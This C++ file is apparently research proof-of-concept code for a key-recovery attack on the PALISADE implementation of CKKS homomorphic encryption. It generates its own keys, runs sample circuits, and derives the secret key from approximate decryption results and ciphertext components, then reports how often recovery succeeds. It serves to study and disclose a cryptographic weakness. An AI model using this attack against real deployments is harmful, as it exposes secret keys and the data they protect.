// Key recovery attack against the PALISADE implementation of CKKS
#include <palisade/pke/palisade.h>
#include <iostream>

#include <cmath>
#include "eval.h"

using namespace lbcrypto;

// ctRes[i] = encryption of x^(2^i), where ct = encryption of x, for 0 <= i <= logDeg
void evalPowerOf2(std::vector<Ciphertext<DCRTPoly>> & ctRes,
                  CryptoContext<DCRTPoly> const& cc, Ciphertext<DCRTPoly> const& ct, int logDeg) {
   ctRes.resize(logDeg+1);

   ctRes[0] = ct;               // x^(2^0)
   for (int i = 1; i <= logDeg; i++) {
      ctRes[i] = cc->EvalMult(ctRes[i-1], ctRes[i-1]); // x^(2^i)
      ctRes[i] = cc->Rescale(ctRes[i]);                // keep it in depth 1
   }
}

// Assume ct = Enc(x), coeff represents a polynomial sum( coeff[i] * x^i )
void evalFunction(Ciphertext<DCRTPoly> & ctRes, CryptoContext<DCRTPoly> const& cc,
                  Ciphertext<DCRTPoly> const& ct, std::vector<double> coeff, int evalDeg = -1) {
   int deg = evalDeg == -1 ? coeff.size()-1 : std::min((size_t)evalDeg, coeff.size() - 1); // assume coeff is not empty
   int logDeg = std::floor(std::log2((double)deg));
   std::cout << "evalFunction " << coeff << " to degree " << deg << std::endl;
   std::vector<Ciphertext<DCRTPoly>> ctPow2s(logDeg+1);
   evalPowerOf2(ctPow2s, cc, ct, logDeg);
   ctRes = cc->EvalMult(ct, coeff[1]);   // c_1 * x
   ctRes = cc->EvalAdd(ctRes, coeff[0]); // c_1 * x + c_0
   for (int i = 2; i <= deg; i++) {
      if (fabs(coeff[i]) < 1e-27) {
         continue;                       // Too small, skip this term
      }
      int k = std::floor(std::log2((double)i));
      int r = i - (1 << k);              // i = 2^k + r
      Ciphertext<DCRTPoly> tmp = ctPow2s[k]; // x^(2^k)
      while (r > 0) {
         k = std::floor(std::log2((double)r));
         r = r - (1 << k);
         tmp = cc->EvalMult(tmp, ctPow2s[k]);
         tmp = cc->Rescale(tmp);
      }
      tmp = cc->EvalMult(tmp, coeff[i]);
      ctRes = cc->EvalAdd(ctRes, tmp);
   }
   ctRes = cc->Rescale(ctRes);           // rescale to depth 1
}

std::vector<double> SIGMOID_COEFF = {1./2,1./4,0,-1./48,0,1./480,0,-17./80640,0,31./1451520,0};
std::vector<double> LOG_COEFF = {0,1,-0.5,1./3,-1./4,1./5,-1./6,1./7,-1./8,1./9,-1./10};
std::vector<double> EXP_COEFF = {1,1,0.5,1./6,1./24,1./120,1./720,1./5040,1./40320,1./362880,1./3628800 };

void evalVariance(Ciphertext<DCRTPoly> & ctRes, CryptoContext<DCRTPoly> const& cc,
                  Ciphertext<DCRTPoly> const& ct, uint32_t logBatchSize) {
   std::cout << "evalVariance size = " << (1<<logBatchSize) << std::endl;
   ctRes = cc->EvalMult(ct, ct); // x^2
   ctRes = cc->Rescale(ctRes);
   for (uint32_t i = 1; i <= logBatchSize; i++) {
      Ciphertext<DCRTPoly> tmp = cc->EvalAtIndex(ctRes, 1 << (logBatchSize - i));
      ctRes = cc->EvalAdd(ctRes, tmp);
   }
   double factor = 1.0/((double)(1 << logBatchSize));
   ctRes = cc->EvalMult(ctRes, factor); // 1/batchSize * sum(x^2)
   ctRes = cc->Rescale(ctRes);
}

int attack(uint32_t scaleFactorBits = 40,   // bit-length of the scaling factor
           uint32_t logBatchSize = 15,      // Use all slots
           double plainBound = 1.0,         // bound on the plaintext numbers
           int evalDeg = -1,                // Max taylor poly degree to use, default to all
           HomomorphicComputation hc = HC_NOOP // which circuit to evaluate
           ) {
   // Setup CryptoContext
   uint32_t multDepth = 20;                  // Force the ring dimension to be 2^16
   uint32_t batchSize = pow(2,logBatchSize); // Number of slots
   RescalingTechnique rsTech = EXACTRESCALE;
   SecurityLevel securityLevel = HEStd_128_classic; // 128-bit secure

   CryptoContext<DCRTPoly> cc =
      CryptoContextFactory<DCRTPoly>::genCryptoContextCKKS(
         multDepth, scaleFactorBits, batchSize, securityLevel, 0, rsTech);

   cc->Enable(ENCRYPTION);
   cc->Enable(SHE);
   cc->Enable(LEVELEDSHE);
   std::cout << "CKKS scheme is using ring dimension " << cc->GetRingDimension()
             << ", scalingFactorBits = " << scaleFactorBits
             << ", slots = " << batchSize
             << ", plaintext size bound = " << plainBound
             << ", rescaling tech = " << rsTech
             << ", ciphertext modulus = " << cc->GetElementParams()->GetModulus() << std::endl;

   // Generate the public/private keys
   auto keys = cc->KeyGen();
   // Generate the evaluation key
   cc->EvalMultKeyGen(keys.secretKey);

   if (hc == HC_VARIANCE) {
      // Generate the rotation keys for computing the variance
      std::vector<int32_t> rotIndexSet(logBatchSize);
      for (int32_t i = 0; i < logBatchSize; i++) {
         rotIndexSet[i] = (1 << i);
      }
      cc->EvalAtIndexKeyGen(keys.secretKey, rotIndexSet);
   }

   // The plaintext to be encrypted
   vector<std::complex<double>> xvec(batchSize), resVec(batchSize);
   randomComplexVector(xvec, batchSize, plainBound);
   // Encoding as plaintexts
   Plaintext ptxt = cc->MakeCKKSPackedPlaintext(xvec);

   // Encrypt the encoded vectors
   auto c = cc->Encrypt(keys.publicKey, ptxt);

   Ciphertext<DCRTPoly> ctRes = c->Clone();
   switch (hc) {
   case HC_VARIANCE :
      evalVariance(ctRes, cc, c, logBatchSize);
      break;
   case HC_SIGMOID :
      evalFunction(ctRes, cc, c, SIGMOID_COEFF, evalDeg);
      break;
   case HC_EXP :
      evalFunction(ctRes, cc, c, EXP_COEFF, evalDeg);
      break;
   default :
      ctRes = c; // noop, just copy the input ciphertext
   }
   if (rsTech == EXACTRESCALE) {
      cc->EvalMultMutable(ctRes,1.0); // force rescaling to depth 1 in EXACTRESCALE
   }

   // Approximate decryption
   Plaintext ptxtRes;
   cc->Decrypt(keys.secretKey, ctRes, &ptxtRes);

   // Decode the polynomial plaintext to complex approximate numbers
   shared_ptr<CKKSPackedEncoding> ptxtResEncoded = std::dynamic_pointer_cast<CKKSPackedEncoding>(ptxtRes);
   Poly ptxtResPoly = ptxtResEncoded->GetElement<Poly>();
   ptxtResPoly.SetFormat(COEFFICIENT);
   resVec = ptxtResEncoded->GetCKKSPackedValue();

   // Check computation errors
   std::vector<std::complex<double>> ptRes(batchSize);
   switch (hc) {
   case HC_VARIANCE :
      evalPlainVariance(ptRes, xvec); // evalPlainFunc(ptRes, xvec, coeff, evalDeg);
      break;
   case HC_SIGMOID :
      evalPlainFunc(ptRes, xvec, SIGMOID_COEFF, evalDeg);
      break;
   case HC_EXP :
      evalPlainFunc(ptRes, xvec, EXP_COEFF, evalDeg);
      break;
   default :
      ptRes = xvec; // noop, just copy the plaintext input
   }
   std::cout << "true value = " << ptRes[0] << ", computation error = " << maxDiff(ptRes, resVec)
             << ", relative error = " << relError(ptRes, resVec) << std::endl;
   
   // Now encode the decrypted approximate numbers to polynomial
   std::cout << "Trying to recover secret key... encode depth = " << ctRes->GetDepth()
             << ", level = " << ctRes->GetLevel()
             << ", scalingFactor = " << std::log2(ctRes->GetScalingFactor()) << std::endl;

   Plaintext ptxtReEnc = cc->MakeCKKSPackedPlaintext(resVec, ctRes->GetDepth(), ctRes->GetLevel());
   shared_ptr<CKKSPackedEncoding> ptxtReEncEncoded = std::dynamic_pointer_cast<CKKSPackedEncoding>(ptxtReEnc);
   ptxtReEncEncoded->Encode();
   DCRTPoly ptxtReEncCRT = ptxtReEncEncoded->GetElement<DCRTPoly>();
   ptxtReEncCRT.SetFormat(EVALUATION);

   Poly ptxtReEncPoly = ptxtReEncCRT.CRTInterpolate();
   ptxtReEncPoly.SetFormat(COEFFICIENT);
   std::cout << "m' norm bits = " << std::log2(ptxtReEncPoly.Norm()) << std::endl;
   Poly error = ptxtResPoly - ptxtReEncPoly;
   std::cout << "Encoding error = " << error.Norm() << std::endl;

   // Retrieve the two components of the ciphertext
   DCRTPoly cb = ctRes->GetElements()[0];
   DCRTPoly ca = ctRes->GetElements()[1];

   ca.SetFormat(EVALUATION);
   cb.SetFormat(EVALUATION);

   // Try to recover the secret key s = (e - cb) / ca
   DCRTPoly caInv =  ca.MultiplicativeInverse();
   DCRTPoly sGuess = (ptxtReEncCRT - cb) * caInv;

   // Retrieve the real secret key s
   LPPrivateKey<DCRTPoly> sk(keys.secretKey);

   size_t towersToDrop = sk->GetPrivateElement().GetParams()->GetParams().size() -
                         cb.GetParams()->GetParams().size();
   auto s(sk->GetPrivateElement());
   s.DropLastElements(towersToDrop);

   return (sGuess == s);
}

int main(int argc, char * argv[]) {
   int iter = 1;
   if (argc == 2) {
      iter = atoi(argv[1]);
   }

   HomomorphicComputation hc = HC_NOOP; // default just evaluate identity function
   uint32_t scaleFactorBits = 40;       // bit-length of the scaling factor
   uint32_t logBatchSize = 15;          // Use all slots
   double plainBound = 1.0;             // bound on the plaintext numbers
   int evalDeg = -1;                    // Max taylor poly degree to use, default to all

   if (argc > 2) {
      hc = parseHC(argv[2]);
   }
   if (argc > 3) {
      uint32_t logN = atoi(argv[3]);
      logBatchSize = logN - 1;
   }
   if (argc > 4) {
      scaleFactorBits = atoi(argv[4]);
   }
   if (argc > 5) {
      plainBound = atof(argv[5]);
   }
   if (argc > 6) {
      evalDeg = atoi(argv[6]);
   }

   int success = 0;
   for (int i = 0; i<iter; i++) {
      if (attack(scaleFactorBits, logBatchSize, plainBound, evalDeg, hc)) {
         std::cout << "Found key!" << std::endl;
         success++;
      }
      else std::cout << "Attack failed!" << std::endl;
   }
   std::cout << "Attack worked " << success << " times out of " << iter << std::endl;

   return 0;
}

